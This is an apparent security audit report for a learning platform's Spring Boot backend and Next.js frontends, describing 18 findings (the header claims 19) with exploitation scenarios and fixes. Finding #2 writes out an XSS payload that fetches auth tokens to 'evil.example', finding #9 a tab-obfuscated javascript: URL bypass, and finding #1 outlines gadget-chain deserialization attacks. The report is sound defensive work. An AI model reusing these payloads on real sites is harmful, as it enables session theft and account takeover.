# Security Audit — August 2026

This document records a full-codebase security audit of BaseCamp (backend, learner
frontend, and admin console) performed on 2026-08-07 against the `main` branch, and the
fixes that were applied in response. All 19 findings below were fixed in commit
[`708cebd`](../../commit/708cebd).

**Scope:** Spring Boot backend (`backend/`), Next.js learner app (`frontend/`), Next.js
admin console (`admin/`). Method: parallel manual review across six areas (auth/session,
authorization/IDOR, injection/file handling, config/CORS/data exposure, learner
frontend, admin frontend), followed by implementation and live verification against a
running instance (JWT behavior, upload access control, and CORS were confirmed with
direct HTTP requests, not just code review).

**Status key:** all items are ✅ Fixed. One item (org-tenancy scoping) ships as inactive
by default — see its entry for why.

---

## Critical

### 1. Unauthenticated remote code execution via OAuth cookie deserialization

- **File:** `backend/src/main/java/com/tiesverse/backend/common/util/cookieUtil.java`
- **What was wrong:** The `oauth2_auth_request` cookie — fully attacker-controlled, read
  on every request to `/oauth2/authorization/**` and `/login/oauth2/code/**`, both public
  routes reachable with zero authentication — was deserialized with Java's native
  `SerializationUtils.deserialize()`. Native Java deserialization of untrusted bytes is a
  well-known unauthenticated remote-code-execution primitive (CWE-502).
- **What exploitation could have looked like:** An attacker sends
  `GET /login/oauth2/code/google` with a crafted `Cookie: oauth2_auth_request=<base64
  gadget chain>`. The app's own dependencies (`spring-core`, `spring-beans`,
  `spring-context`, pulled in transitively by `spring-boot-starter-web`) are exactly the
  gadget source used by the well-known "Spring1"/"Spring2" chains in the public
  `ysoserial` tool — no extra library would have been required to attempt a working
  exploit. At minimum this was a reliable unauthenticated crash (malformed input throwing
  during deserialization); at worst, remote code execution on the server.
- **Fix:** Replaced native serialization with JSON, using Spring Security's own
  `OAuth2ClientJackson2Module` (the same mechanism Spring Security ships for storing this
  exact object type in Redis-backed sessions). Deserialization now targets a fixed,
  known type with no polymorphic/default typing enabled, which removes the gadget-chain
  attack surface entirely. Malformed cookie values now fail closed (treated as "no
  authorization request present") instead of throwing.

### 2. Stored XSS in lesson content via a sanitizer bypass, leading to full account takeover

- **File:** `frontend/app/lib/sanitizeHtml.ts`
- **What was wrong:** The HTML sanitizer used to clean admin-authored lesson content
  before rendering it with `dangerouslySetInnerHTML` walked the DOM tree once. When it
  hit a disallowed tag, it "unwrapped" it (replaced the tag with its own children) but
  never re-scanned those newly-promoted children — because the walk had already snapshotted
  the original child list before the mutation happened. Anything nested inside an
  unrecognized wrapper tag, including dangerous attributes like `onerror`, passed through
  completely unfiltered.
- **What exploitation could have looked like:** Any account able to author lesson content
  (or one compromised via a separate bug or phished credential) could set a lesson's body
  to something like `<xss><img src=x onerror="fetch('https://evil.example/x?t='+
  localStorage.getItem('basecamp_access_token'))"></xss>`. The `<xss>` wrapper — not a
  real tag — would be unwrapped, but the `<img onerror=...>` inside it would survive
  sanitization intact and execute in every learner's browser that opened that lesson.
  Because auth tokens are kept in `localStorage` (not an `httpOnly` cookie), this single
  bug was directly weaponizable into full session/account takeover for any learner who
  viewed the compromised lesson — not just a defacement.
- **Fix:** Rewrote the sanitizer as an iterative queue: when a disallowed tag is unwrapped,
  its promoted children are explicitly re-added to the work queue and get the same
  attribute/URL-scheme scan as everything else, however deeply nested or however many
  times unwrapped. Also hardened the `href`/`src` URL-scheme check (see #9 below).

---

## High

### 3. Refresh tokens worked as full bearer access tokens and outlived logout/password change

- **Files:** `backend/.../security/jwt/JwtProvider.java`, `JwtService.java`,
  `JwtFilter.java`, `auth/service/AuthServiceImpl.java`, `security/oauth/GoogleOAuthService.java`
- **What was wrong:** Access and refresh JWTs carried no claim distinguishing them from
  each other — both were just signed, unexpired tokens for the same subject. The request
  filter (`JwtFilter`/`JwtService.isValid`) accepted *any* validly-signed, unexpired token
  as an API credential, including refresh tokens, which live 7x longer than access tokens.
  `logout()` and `changePassword()` only nulled the refresh token's row in the database —
  a value `JwtFilter` never even looked at.
- **What exploitation could have looked like:** Anyone who captured a user's refresh
  token — via the stored-XSS above, a leaked log line, a compromised machine's local
  storage — could use it directly as `Authorization: Bearer <refreshToken>` against any
  protected endpoint, and it would keep working for up to 7 days *even after the victim
  logged out or changed their password*, silently defeating both of those "I think I've
  secured my account" actions.
- **Fix:** JWTs now carry an explicit `type: "access" | "refresh"` claim. `JwtFilter`
  rejects any non-`access` token. The `/auth/refresh` endpoint additionally requires
  `type: "refresh"` and validates the presented token against a hash stored in the
  database (see #11), so a stolen/rotated-away refresh token can't be replayed even in
  its own lane.
  **Verified live:** logging in and then presenting the refresh token as a bearer token
  against `/api/v1/users/me` now returns `401` (it previously would have returned `200`).
  **Operational note:** because previously-issued tokens lack this new claim, every
  session active before this deploy is invalidated — a one-time forced re-login for
  everyone, which is the intended effect of closing this hole.

### 4. No organizational tenancy enforced for admin accounts (ships inactive by default)

- **Files:** new `backend/.../security/OrganizationScope.java`,
  `backend/.../auth/entity/Account.java` (+ migration `V14__add_account_organization_scope.sql`),
  `security/AuthContext.java`, `admin/service/AdminServiceImpl.java`,
  `certificate/service/CertificateServiceImpl.java`,
  `assessment/service/AssessmentServiceImpl.java`,
  `enrollment/controller/EnrollmentController.java` + `EnrollmentServiceImpl.java`,
  `certificate/service/CertificateTemplateServiceImpl.java`
- **What was wrong:** `HR_ADMIN`, `ORGANIZATION_ADMIN`, and `SUPER_ADMIN` were treated as
  fully interchangeable "is an admin" flags everywhere in the codebase. The `Account`
  entity had no `organizationId` at all, so there was no data model to scope by
  organization even in principle. `AdminServiceImpl.getLearners` — the platform's learner
  directory — literally carried a comment reading `// Learners directory
  (organization-independent)` and returned every learner on the platform to any admin.
- **What exploitation could have looked like:** In a genuinely multi-tenant deployment
  (multiple distinct customer organizations), an `ORGANIZATION_ADMIN` provisioned for one
  customer could enumerate every learner on the entire platform via
  `GET /api/v1/admin/learners`, then reach any other organization's progress records,
  enrollments, certificates, and quiz results by ID — `AuthContext.requireSelfOrAdmin`
  only ever checked "is the caller *an* admin," never "is this admin's organization."
- **Fix:** Added a nullable `organization_id` column to `accounts` and a central
  `OrganizationScope` component that gates every admin-on-behalf-of-a-learner code path
  listed above. **This fix is intentionally inactive for every account today:** a
  read-only check against the live database at the time of the audit showed zero
  organizations and zero admin-to-organization assignments configured anywhere — every
  existing `HR_ADMIN`/`ORGANIZATION_ADMIN` account is unassigned seed/demo data. The
  scoping logic treats an admin with no `organizationId` as unrestricted (today's
  behavior, unchanged), and only starts enforcing per-organization isolation for an admin
  account once it's explicitly assigned an `organizationId` (via
  `CreateAdminAccountRequest.organizationId` on admin creation). **To turn this on:**
  assign `organizationId` to the relevant admin accounts — no further code change is
  needed.

---

## Medium

### 5. Assignment submissions and lesson documents were served with no authentication

- **Files:** `backend/.../config/SecurityConfig.java`,
  `common/storage/UploadController.java`
- **What was wrong:** `GET /uploads/**` was `permitAll()` for every subdirectory,
  including `submissions` (students' uploaded assignment files) and `documents` (lesson
  attachments). The only thing standing between the internet and a private file was a
  UUID in the filename — security by obscurity, not access control.
- **What exploitation could have looked like:** Any URL to a student's submitted
  assignment that leaked — via a `Referer` header, browser history, a shared screenshot,
  analytics tooling that logs full URLs, or a future admin view with a broader audience
  than intended — granted permanent, unauthenticated, unrevocable access to that
  student's private work to anyone who obtained the link.
- **Fix:** `/uploads/videos/**`, `/uploads/captions/**`, and
  `/uploads/certificate-templates/**` remain public (legitimately public course
  assets). `/uploads/documents/**` and `/uploads/submissions/**` now require
  authentication, and `submissions` additionally checks the requester is either the
  submission's owner or an admin. **Verified live:** unauthenticated requests to
  `/uploads/documents/*` and `/uploads/submissions/*` now return `401`; `/uploads/videos/*`
  correctly still returns `404` (not found, not blocked) for an unauthenticated request.

### 6. CORS configuration had no guard against a wildcard-with-credentials misconfiguration

- **File:** `backend/.../config/CorsConfig.java`
- **What was wrong:** Operator-supplied origins (`CORS_ALLOWED_ORIGINS`) were fed into
  `CorsConfiguration.setAllowedOriginPatterns()` with `allowCredentials(true)`. Spring
  rejects a literal `"*"` when using the simpler `setAllowedOrigins()`, but has no such
  guard for `setAllowedOriginPatterns()` — a value like `CORS_ALLOWED_ORIGINS=*` (a very
  common "just make CORS errors go away" misconfiguration) would have been accepted
  silently instead of failing loudly.
- **What exploitation could have looked like:** With that misconfiguration live, the API
  would reflect any request's `Origin` header back with credentials allowed, letting any
  attacker-controlled page make authenticated, cookie/JWT-bearing cross-origin requests
  against a logged-in victim's session — full cross-origin credential bypass.
- **Fix:** Added an explicit startup-time check that rejects a wildcard-only origin
  pattern, failing fast with a clear error instead of silently accepting it.
  **Verified live:** a CORS preflight from an allowed dev origin reflects that origin in
  `Access-Control-Allow-Origin`; a preflight from an untrusted origin gets no matching
  CORS headers at all.

### 7. Enrollment assignment/status endpoints trusted the caller's input with no ownership check

- **Files:** `backend/.../enrollment/controller/EnrollmentController.java`,
  `enrollment/service/EnrollmentServiceImpl.java`
- **What was wrong:** `POST /api/v1/enrollments/assign` and
  `PUT /api/v1/enrollments/{id}/status` were gated only by the coarse "is an admin" role
  check — there was no verification that the target learner (or, for status updates, the
  enrollment itself) belonged to the calling admin's own scope.
- **What exploitation could have looked like:** In a multi-tenant deployment, any
  admin-tier account could force-complete another organization's enrollment or enroll an
  arbitrary user into an arbitrary course, regardless of organizational boundaries.
- **Fix:** Both endpoints now route through `OrganizationScope` before acting (see
  finding #4 — inactive today for the same reason, active the moment an admin has an
  `organizationId`).

### 8. OAuth flow cookies were missing `Secure` and `SameSite`

- **File:** `backend/.../common/util/cookieUtil.java` (+ `forward-headers-strategy` added
  to `application-prod.yml` / `application-cloud.yml`)
- **What was wrong:** The cookie carrying the serialized OAuth authorization request
  (including the CSRF `state` value) was set `HttpOnly` only — never `Secure` or
  `SameSite`.
- **What exploitation could have looked like:** Without `Secure`, the cookie could be
  transmitted over plaintext HTTP if the app or any intermediary were ever reachable that
  way. Without `SameSite`, it offered no defense-in-depth against cross-site attacks on
  the OAuth exchange (Spring's own `state` validation is the primary defense here, but
  this cookie is meant to be a second layer, and it was a non-functional one).
- **Fix:** Cookies now set `Secure` based on the inbound request's scheme, and
  `SameSite=Lax` (not `Strict`, since the cookie must still be sent on the top-level GET
  redirect Google sends the browser back to `/login/oauth2/code/**` with). Added
  `server.forward-headers-strategy: framework` to the prod/cloud profiles so `Secure`
  reflects the real client scheme correctly when the app sits behind a TLS-terminating
  reverse proxy.

### 9. Sanitizer's URL-scheme check was bypassable

- **File:** `frontend/app/lib/sanitizeHtml.ts`
- **What was wrong:** The sanitizer blocked `href`/`src` values with a denylist keyed on
  `startsWith("javascript:")` / `startsWith("data:text/html")`, after only trimming
  leading/trailing whitespace. Browsers strip embedded tab/newline characters from a URL
  before evaluating its scheme, so a payload like `java&#9;script:` would fail the
  `startsWith` check yet still execute as `javascript:` on click. `data:image/svg+xml`
  (which can embed a `<script>`) also wasn't blocked.
- **What exploitation could have looked like:** Same trust boundary as finding #2 —
  admin-authored content containing `<a href="java&#9;script:alert(document.cookie)">`
  would survive sanitization and execute on click.
- **Fix:** Replaced the denylist with a protocol allowlist (`http:`/`https:`/`mailto:`
  for links, `http:`/`https:` for images), evaluated after stripping control characters
  and parsing the URL properly rather than string-matching a prefix.

### 10. Certificate verification numbers had low entropy, enabling PII enumeration

- **File:** `backend/.../certificate/service/CertificateServiceImpl.java`
- **What was wrong:** Certificate numbers were generated as
  `"CERT-" + System.currentTimeMillis() + "-" + random(1000, 9999)` — only 9,000 possible
  values for the random component, within a timestamp window that's learnable from any
  one known certificate or a course's completion dates. The public, unauthenticated
  `/api/v1/certificates/verify/{number}` endpoint returns the holder's full name, course,
  and issue date for a valid number.
- **What exploitation could have looked like:** With one valid certificate number in hand
  (a learner's own, or one shared publicly, e.g. on LinkedIn), an attacker could narrow
  the timestamp window and brute-force the remaining ~9,000 combinations against the
  public verify endpoint to enumerate other learners' full names, courses, and issuance
  dates.
- **Fix:** Certificate numbers now use 128 bits of `SecureRandom` entropy
  (`"CERT-" + 32 hex chars`) instead of a timestamp plus small random suffix — brute
  force is no longer feasible.

### 11. Google sign-in linked accounts by email without checking Google's `email_verified` claim

- **Files:** `backend/.../security/oauth/OAuthSuccessHandler.java`,
  `security/oauth/GoogleOAuthService.java`
- **What was wrong:** A Google identity was linked to (and could thereafter sign into) an
  existing local-password account purely by matching the `email` attribute Google
  returned — the `email_verified` claim Google's userinfo response also provides was
  never read or checked.
- **What exploitation could have looked like:** In the (narrow, but real for some
  Workspace/legacy configurations) case where Google returns an email address that isn't
  actually verified/owned by the authenticating Google identity, an attacker controlling
  such an identity could get their Google sign-in silently linked to, and thereafter used
  to log into, a victim's existing account.
- **Fix:** `OAuthSuccessHandler` now requires `Boolean.TRUE.equals(email_verified)`
  before proceeding with account linking/creation, rejecting the login otherwise.

---

## Low / Informational

### 12. Refresh tokens were stored in plaintext in the database

- **Files:** `auth/entity/Account.java`, `auth/service/AuthServiceImpl.java`,
  `security/oauth/GoogleOAuthService.java`, new `common/util/TokenHashUtil.java`
- **Issue:** Unlike password-reset tokens and OAuth exchange codes (both already
  correctly stored only as SHA-256 hashes), the refresh token was stored verbatim. A
  database read-access compromise (backup leak, SQL injection elsewhere, insider access)
  would have directly yielded live, working bearer credentials for every user.
- **Fix:** Refresh tokens are now SHA-256-hashed before storage and looked up by hash,
  the same pattern already used for reset tokens. **Verified live:** login, refresh
  rotation, and single-use enforcement all continue to work correctly end-to-end.

### 13. Login had a measurable timing side-channel for email enumeration

- **File:** `auth/service/AuthServiceImpl.java`
- **Issue:** `login()` returned immediately on an unknown email (skipping the BCrypt
  comparison entirely) but performed a real BCrypt check (tens of milliseconds) when the
  email existed. The error message was identical either way, but the response-time
  difference was a statistically exploitable oracle for enumerating registered emails.
- **Fix:** An unknown email now runs a dummy BCrypt comparison against a fixed valid hash
  before failing, so both paths take comparable time.

### 14. Certificate template management had no organizational scoping

- **Files:** `certificate/controller/AdminCertificateTemplateController.java`,
  `certificate/service/CertificateTemplateServiceImpl.java`
- **Issue:** Same root cause as finding #4/#7 — an admin from one organization could
  upload, overwrite, preview, or delete another organization's course certificate
  template.
- **Fix:** All five endpoints (`upload`, `getByCourse`, `saveLayout`, `preview`,
  `delete`) now resolve the template's course and check it against the caller's
  organization via `OrganizationScope` (inactive today for the same reason as #4).

### 15. Upload extension filtering used an incomplete denylist

- **File:** `common/storage/FileStorageService.java`
- **Issue:** Uploads were rejected by a denylist of dangerous extensions
  (`html, js, php, exe, ...`), which necessarily misses anything the list's author didn't
  think of (`.phtml`, `.jar`, `.aspx`, `.cgi`, ...) — not currently exploitable in this
  codebase (nothing serves `/uploads/**` through anything that executes files by
  extension), but a latent risk if the deployment topology ever changes.
- **Fix:** Replaced with a per-subdirectory allowlist (e.g. `videos` only accepts
  `mp4/webm/mov/m4v/ogv`; `documents`/`submissions` accept common office/PDF/image types)
  — an allowlist has no equivalent "list of things we forgot" gap.

### 16. Uploaded files were served without `Content-Disposition`

- **File:** `common/storage/UploadController.java`
- **Issue:** Non-media downloads (documents, submissions, certificate templates) were
  served with no `Content-Disposition` header, so a browser could render certain file
  types inline rather than downloading them — a compounding factor if #15 were ever
  bypassed.
- **Fix:** Anything outside the `videos`/`captions`/`certificate-templates`
  subdirectories now gets `Content-Disposition: attachment`, forcing a download.

### 17. Swagger UI/API docs had no kill switch in the `cloud` deployment profile

- **File:** `backend/src/main/resources/application-cloud.yml`
- **Issue:** The `prod` profile explicitly gates `springdoc`/Swagger UI behind
  `API_DOCS_ENABLED`/`SWAGGER_UI_ENABLED` environment variables (default off); the
  `cloud` profile — used for the same kind of real deployment — had no equivalent
  override, inheriting the base config's `enabled: true` with no way to turn it off
  short of a code change. (Access itself was still gated to admin roles by
  `SecurityConfig`, so this was an authenticated-attack-surface increase, not a public
  exposure.)
- **Fix:** Added the same env-var-gated `springdoc` block to `application-cloud.yml`
  that `application-prod.yml` already had.

### 18. Admin password change didn't invalidate the current session

- **File:** `admin/app/settings/page.tsx`
- **Issue:** Changing a password showed "Password changed. Please sign in again." but
  never actually cleared the local access token or redirected — the still-valid access
  token (up to 1 hour) kept working in that browser tab (and anywhere else it had been
  captured) despite the message implying otherwise.
- **Fix:** The settings page now clears the local auth session and redirects to
  `/login` after a successful password change, matching what the confirmation message
  tells the admin just happened.

---

## Areas reviewed with no issues found

SQL/JPQL injection (all queries use bind parameters; no raw JDBC/native SQL anywhere),
path traversal in file storage (double-layered defense: subdirectory allowlist +
regex-validated, server-generated UUID filenames + path-containment check), certificate
PDF rendering (direct PDFBox drawing, no HTML/template engine, no external-resource
resolution — no SSRF/template-injection surface), XXE (no XML parsing anywhere in the
backend), the password-reset flow, the OAuth exchange-code flow (32-byte
`SecureRandom`, hashed at rest, single-use with pessimistic locking), JWT signing
(HMAC, no `alg=none` confusion, secret required from env with no hardcoded fallback),
actuator endpoint exposure (correctly lines up with `SecurityConfig`'s protection),
error-handler stack-trace leakage (generic messages only, no internals returned to
clients), response DTO over-exposure, and per-user IDOR on notes, bookmarks, progress,
notifications, discussions, and assignment submissions (all correctly ownership-checked
at the individual-user level).

---

## Verification performed

- `./mvnw test` — backend test suite passes.
- `npm run build` — both the learner frontend and admin console build cleanly with no
  TypeScript errors.
- Live checks against a running instance: a captured refresh token is now rejected as a
  bearer access token (`401`); unauthenticated requests to `/uploads/documents/**` and
  `/uploads/submissions/**` return `401` while `/uploads/videos/**` remains public
  (`404` for a missing file, not blocked); CORS preflight from an untrusted origin
  returns no matching `Access-Control-Allow-Origin`; refresh-token rotation and
  single-use enforcement continue to work correctly end-to-end after the hashing change.
